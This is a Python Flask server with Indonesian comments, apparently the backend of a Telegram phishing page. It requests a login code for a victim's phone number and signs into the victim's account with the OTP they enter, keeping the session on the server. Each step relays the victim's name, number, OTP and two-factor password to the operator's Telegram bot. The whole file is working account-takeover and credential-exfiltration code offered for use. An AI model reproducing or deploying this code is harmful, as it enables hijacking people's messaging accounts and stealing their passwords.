import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

# Ambil dari Environment Variables Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan sementara hash untuk verifikasi OTP
sessions_hash = {}

def fix_number(nomor):
    """Konversi 08xxx ke +628xxx"""
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith('0'): return '+62' + nomor[1:]
    return nomor

def send_to_bot(message):
    """Kirim log ke bot Telegram Anda"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

async def telethon_logic(data):
    step = data.get('step')
    nomor = fix_number(data.get('nomor', ''))
    otp = data.get('otp')
    nama = data.get('nama', 'User')
    sandi = data.get('sandi', 'None')

    # Gunakan session unik per nomor agar tidak tabrakan
    client = TelegramClient(f"sessions/session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            # Langkah 1: Minta Telegram kirim OTP ke target
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n\n🔄 *Status:* Menunggu OTP...")
            return {"status": "success"}, 200
            
        elif step == 2:
            # Langkah 2: Verifikasi OTP yang dimasukkan target
            phone_hash = sessions_hash.get(nomor)
            if not phone_hash:
                return {"status": "error", "message": "Sesi kedaluwarsa. Silakan kirim ulang."}, 400
            
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_hash)
                send_to_bot(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n✅ *Status:* Login Berhasil!")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                send_to_bot(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔑 *OTP:* `{otp}`\n\n⚠️ *Status:* Butuh Verifikasi 2FA")
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "OTP SALAH!!"}, 400
                
        elif step == 3:
            # Langkah 3: Jika ada 2FA
            send_to_bot(f"👤 *Nama:* {nama}\n📱 *Nomor:* `{nomor}`\n🔐 *Kata Sandi:* `{sandi}`\n\n✅ *Status:* Selesai")
            return {"status": "success"}, 200
            
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    result, status_code = async_to_sync(telethon_logic)(request.json)
    return jsonify(result), status_code

if __name__ == "__main__":
    if not os.path.exists('sessions'): os.makedirs('sessions')
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))